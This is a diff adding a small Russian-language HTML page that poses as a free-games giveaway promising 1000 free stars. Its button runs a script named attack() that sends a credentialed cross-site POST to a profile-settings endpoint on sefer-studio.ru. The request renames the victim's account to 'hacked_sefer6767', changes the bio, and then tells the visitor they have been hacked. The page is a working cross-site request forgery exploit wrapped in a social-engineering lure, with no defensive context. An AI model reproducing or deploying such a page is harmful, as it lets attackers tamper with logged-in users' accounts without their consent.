@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Бесплатные игры!</title>
+</head>
+<body>
+    <h1>Получите 1000 звезд бесплатно!</h1>
+    <button onclick="attack()">Нажми сюда!</button>
+    
+    <script>
+    function attack() {
+       
+        fetch('https://sefer-studio.ru/api/settings/profile', {
+            method: 'POST',
+            credentials: 'include',
+            body: new URLSearchParams({
+                username: 'hacked_sefer6767',
+                bio: 'Сефер '
+            })
+        });
+        
+        alert('Вы взломаны!');
+    }
+    </script>
+</body>
+</html>
